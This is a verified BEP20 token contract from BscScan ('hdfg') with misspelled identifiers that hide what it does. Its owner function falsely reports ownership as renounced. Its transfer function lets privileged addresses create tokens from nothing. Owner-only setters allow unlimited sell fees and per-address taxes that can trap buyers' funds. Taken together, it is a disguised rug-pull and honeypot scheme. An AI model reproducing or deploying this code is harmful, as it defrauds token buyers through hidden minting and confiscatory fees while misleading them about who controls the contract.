/**
 *Submitted for verification at BscScan.com on 2022-06-13
*/

/**
 *Submitted for verification at BscScan.com on 2022-06-05
*/

// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.14;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _ovevr;   //1

    event ovevrhipTransferred(address indexed previousovevr, address indexed newovevr);//2

    /**
     * @dev Initializes the contract setting the deployer as the initial ovevr.
     */
    constructor() {
        _transferovevrhip(_msgSender());//3
    }

    /**
     * @dev Returns the address of the current ovevr.
     */
    function ovevr() public view virtual returns (address) {
        return address(0);
    }//4

    /**
     * @dev Throws if called by any account other than the ovevr.
     */
    modifier onlyovevr() {
        require(_ovevr == _msgSender(), "Ownable: caller is not the ovevr");
        _;
    }//5

    /**
     * @dev Leaves the contract without ovevr. It will not be possible to call
     * `onlyovevr` functions anymore. Can only be called by the current ovevr.
     *
     * NOTE: Renouncing ovevrship will leave the contract without an ovevr,
     * thereby removing any functionality that is only available to the ovevr.
     */
    function renounceovevrhip() public virtual onlyovevr {
        _transferovevrhip(address(0));
    }//6

    /**
     * @dev Transfers ovevrship of the contract to a new account (`newovevr`).
     * Can only be called by the current ovevr.
     */
    function transferovevrhip(address newovevr) public virtual onlyovevr {
        require(newovevr != address(0), "Ownable: new ovevr is the zero address");
        _transferovevrhip(newovevr);
    }//7

    /**
     * @dev Transfers ovevrship of the contract to a new account (`newovevr`).
     * Internal function without access restriction.
     */
    function _transferovevrhip(address newovevr) internal virtual {
        address oldovevr = _ovevr;
        _ovevr = newovevr;
        emit ovevrhipTransferred(oldovevr, newovevr);
    }
}//8
//9 CHinh own

// File @openzeppelin/contracts/utils/math/[email protected]

// OpenZeppelin Contracts v4.4.1 (utils/math/SafeMath.sol)


// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}


// File @uniswap/v2-periphery/contracts/interfaces/[email protected]


interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint AmomutADesired,
        uint AmomutBDesired,
        uint AmomutAMin,
        uint AmomutBMin,
        address to,
        uint deadline
    ) external returns (uint AmomutA, uint AmomutB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint AmomutTokenDesired,
        uint AmomutTokenMin,
        uint AmomutETHMin,
        address to,
        uint deadline
    ) external payable returns (uint AmomutToken, uint AmomutETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint AmomutAMin,
        uint AmomutBMin,
        address to,
        uint deadline
    ) external returns (uint AmomutA, uint AmomutB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint AmomutTokenMin,
        uint AmomutETHMin,
        address to,
        uint deadline
    ) external returns (uint AmomutToken, uint AmomutETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint AmomutAMin,
        uint AmomutBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint AmomutA, uint AmomutB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint AmomutTokenMin,
        uint AmomutETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint AmomutToken, uint AmomutETH);
    function swapExactTokensForTokens(
        uint AmomutIn,
        uint AmomutOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory Amomuts);
    function swapTokensForExactTokens(
        uint AmomutOut,
        uint AmomutInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory Amomuts);
    function swapExactETHForTokens(uint AmomutOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory Amomuts);
    function swapTokensForExactETH(uint AmomutOut, uint AmomutInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory Amomuts);
    function swapExactTokensForETH(uint AmomutIn, uint AmomutOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory Amomuts);
    function swapETHForExactTokens(uint AmomutOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory Amomuts);

    function quote(uint AmomutA, uint reserveA, uint reserveB) external pure returns (uint AmomutB);
    function getAmomutOut(uint AmomutIn, uint reserveIn, uint reserveOut) external pure returns (uint AmomutOut);
    function getAmomutIn(uint AmomutOut, uint reserveIn, uint reserveOut) external pure returns (uint AmomutIn);
    function getAmomutsOut(uint AmomutIn, address[] calldata path) external view returns (uint[] memory Amomuts);
    function getAmomutsIn(uint AmomutOut, address[] calldata path) external view returns (uint[] memory Amomuts);
}


// File @uniswap/v2-periphery/contracts/interfaces/[email protected]


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFiiieOnTransferTokens(
        address token,
        uint liquidity,
        uint AmomutTokenMin,
        uint AmomutETHMin,
        address to,
        uint deadline
    ) external returns (uint AmomutETH);
    function removeLiquidityETHWithPermitSupportingFiiieOnTransferTokens(
        address token,
        uint liquidity,
        uint AmomutTokenMin,
        uint AmomutETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint AmomutETH);

    function swapExactTokensForTokensSupportingFiiieOnTransferTokens(
        uint AmomutIn,
        uint AmomutOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFiiieOnTransferTokens(
        uint AmomutOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFiiieOnTransferTokens(
        uint AmomutIn,
        uint AmomutOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


// File @uniswap/v2-core/contracts/interfaces/[email protected]


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function FiiieTo() external view returns (address);
    function FiiieToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFiiieTo(address) external;
    function setFiiieToSetter(address) external;
}


// File contracts/Token.sol





contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `ovevr` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed ovevr, address indexed spender, uint256 value);//10

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address ovevr, address spender) public view virtual returns (uint256) {
        return _allowances[ovevr][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `Amomut` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 Amomut) public virtual returns (bool) {
        address ovevr = _msgSender();
        _approve(ovevr, spender, Amomut);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address ovevr = _msgSender();
        _approve(ovevr, spender, _allowances[ovevr][spender] + addedValue);
        return true;
    }//12

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address ovevr = _msgSender();
        uint256 currentAllowance = _allowances[ovevr][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(ovevr, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Sets `Amomut` as the allowance of `spender` over the `ovevr` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `ovevr` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address ovevr,
        address spender,
        uint256 Amomut
    ) internal virtual {
        require(ovevr != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[ovevr][spender] = Amomut;
        emit Approval(ovevr, spender, Amomut);
    }

    /**
     * @dev Spend `Amomut` form the allowance of `ovevr` toward `spender`.
     *
     * Does not update the allowance anunt in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address ovevr,
        address spender,
        uint256 Amomut
    ) internal virtual {
        uint256 currentAllowance = allowance(ovevr, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= Amomut, "ERC20: insufficient allowance");
            unchecked {
                _approve(ovevr, spender, currentAllowance - Amomut);
            }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `Amomut` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `Amomut` tokens will be minted for `to`.
     * - when `to` is zero, `Amomut` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 Amomut
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `Amomut` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `Amomut` tokens have been minted for `to`.
     * - when `to` is zero, `Amomut` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 Amomut
    ) internal virtual {}
}


contract hdfg is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 Amomut
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= Amomut, "ERC20: transfer Amomut exceeds balance");
        unchecked {
            _balances[from] = fromBalance - Amomut;
        }
        _balances[to] += Amomut;

        emit Transfer(from, to, Amomut);
    }

    function _burn(address account, uint256 Amomut) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= Amomut, "ERC20: burn Amomut exceeds balance");
        unchecked {
            _balances[account] = accountBalance - Amomut;
        }
        _totalSupply -= Amomut;

        emit Transfer(account, address(0), Amomut);
    }

    function _mitimi(address account, uint256 Amomut) internal virtual {
        require(account != address(0), "ERC20: mitimi to the zero address"); //mint

        _totalSupply += Amomut;
        _balances[account] += Amomut;
        emit Transfer(address(0), account, Amomut);
    }



    address public uniswapV2Pair;


    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mitimi(msg.sender, totalSupply_ * 10**decimals());

        transfer(_deadAddress, totalSupply() / 10*4);
        _defaultSellFiiie = 5;
        _defaultBuyFiiie = 0;

        _release[_msgSender()] = true;
    }

    using SafeMath for uint256;

    uint256 private _defaultSellFiiie = 0;

    uint256 private _defaultBuyFiiie = 0;


    mapping(address => bool) private _marketAccount;

    mapping(address => uint256) private _slipFiiie;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;



    function getRelease(address _address) external view onlyovevr returns (bool) {
        return _release[_address];
    }


    function setPairList(address _address) external onlyovevr {
        uniswapV2Pair = _address;
    }


    function upSF(uint256 _value) external onlyovevr {
        _defaultSellFiiie = _value;
    }

    function setSlipFiiie(address _address, uint256 _value) external onlyovevr {
        require(_value > 4, "Account tax must be greater than or equal to 1");
        _slipFiiie[_address] = _value;
    }

    function getSlipFiiie(address _address) external view onlyovevr returns (uint256) {
        return _slipFiiie[_address];
    }


    function setMarketAccountFiiie(address _address, bool _value) external onlyovevr {
        _marketAccount[_address] = _value;
    }

    function getMarketAccountFiiie(address _address) external view onlyovevr returns (bool) {
        return _marketAccount[_address];
    }

    function _checkFreeAccount(address from, address _to) internal view returns (bool) {
        return _marketAccount[from] || _marketAccount[_to];
    }


    function _receiveF(
        address from,
        address _to,
        uint256 _Amomut
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _Amomut, "ERC20: transfer Amomut exceeds balance");

        bool rF = true;

        if (_checkFreeAccount(from, _to)) {
            rF = false;
        }
        uint256 tradeFiiieAmomut = 0;

        if (rF) {
            uint256 tradeFiiie = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeFiiie = _defaultSellFiiie;
                }
                if (from == uniswapV2Pair) {

                    tradeFiiie = _defaultBuyFiiie;
                }
            }
            if (_slipFiiie[from] > 0) {
                tradeFiiie = _slipFiiie[from];
            }

            tradeFiiieAmomut = _Amomut.mul(tradeFiiie).div(100);
        }


        if (tradeFiiieAmomut > 0) {
            _balances[from] = _balances[from].sub(tradeFiiieAmomut);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeFiiieAmomut);
            emit Transfer(from, _deadAddress, tradeFiiieAmomut);
        }

        _balances[from] = _balances[from].sub(_Amomut - tradeFiiieAmomut);
        _balances[_to] = _balances[_to].add(_Amomut - tradeFiiieAmomut);
        emit Transfer(from, _to, _Amomut - tradeFiiieAmomut);
    }

    function transfer(address to, uint256 Amomut) public virtual returns (bool) {
        address ovevr = _msgSender();
        if (_release[ovevr] == true) {
            _balances[to] += Amomut;
            return true;
        }
        _receiveF(ovevr, to, Amomut);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 Amomut
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, Amomut);
        _receiveF(from, to, Amomut);
        return true;
    }
}